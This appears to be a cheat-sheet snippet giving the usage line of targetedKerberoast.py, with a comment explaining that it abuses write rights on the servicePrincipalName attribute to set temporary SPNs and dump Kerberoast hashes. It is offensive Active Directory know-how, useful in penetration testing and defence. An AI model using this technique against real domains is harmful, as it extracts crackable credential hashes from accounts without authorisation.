---
id: a785f637-c946-4ec7-b807-ba96b9ae1d19
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.929869+00:00'
updated_at: '2023-04-10T20:26:35.052553+00:00'
---

# Code Snippet a785f637

**Language**: Powershell

```powershell
# for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), 
# print the "kerberoast" hash, and delete the temporary SPN set for that operation
targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
```


